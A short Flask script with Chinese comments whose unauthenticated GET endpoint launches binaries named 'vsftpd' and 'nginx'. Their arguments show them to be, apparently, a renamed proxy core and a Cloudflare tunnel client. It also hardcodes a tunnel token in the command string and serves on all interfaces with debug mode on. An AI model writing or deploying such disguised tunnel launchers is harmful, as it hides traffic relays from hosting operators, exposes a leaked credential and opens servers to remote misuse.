from flask import Flask, jsonify
import os
import subprocess
import logging

# 配置日志
logging.basicConfig(level=logging.DEBUG)  # 设置日志级别为 DEBUG，输出详细日志

app = Flask(__name__)

@app.route('/')
def get_pwd():
    current_directory = os.getcwd()
    return jsonify({"current_directory": current_directory})

@app.route('/run-commands', methods=['GET'])
def run_commands():
    try:
        # 定义要执行的命令，并确保它们在同一 shell 中执行
        command = "cd abc && ./vsftpd run -c ./config.json && ./nginx tunnel --edge-ip-version auto --protocol http2 run --token eyJhIjoiNTg5NmMzMGU0NWEyZTMyZDU4NWE1MTIxYmI2ZWNkNGYiLCJ0IjoiMzU0ZjEzYzktMWVlMC00NTVmLTkwYTktOWIyZTA5YzdlMmEwIiwicyI6Ik9HSXlZbUZsWTJZdE5ESmlNeTAwTlRBNUxXRTVObUl0TW1JNU1XTmhNak5qTWpObCJ9"
        
        # 打印命令本身到控制台和日志
        logging.debug(f"Executing command: {command}")
        print(f"Executing command: {command}")  # 控制台打印
        
        # 执行合并命令
        process = subprocess.run(
            command, shell=True, text=True, capture_output=True
        )
        
        # 打印输出到控制台
        print(f"Command output:\n{process.stdout}")
        print(f"Command error:\n{process.stderr}")
        
        # 记录详细的输出到日志
        if process.returncode == 0:
            logging.debug(f"Command executed successfully. Output:\n{process.stdout}")
        else:
            logging.error(f"Command execution failed with error: {process.stderr}")
        
        # 将执行结果记录到 result 中
        result = ""
        if process.returncode == 0:
            result += f"Output:\n{process.stdout}\n"
        else:
            result += f"Error:\n{process.stderr}\n"
        
        # 获取当前目录
        current_directory = os.getcwd()

        # 返回执行结果和当前目录
        return jsonify({"status": "success", "result": result, "current_directory": current_directory})
    
    except Exception as e:
        logging.error(f"Error occurred: {str(e)}")
        print(f"Error occurred: {str(e)}")  # 控制台打印错误信息
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
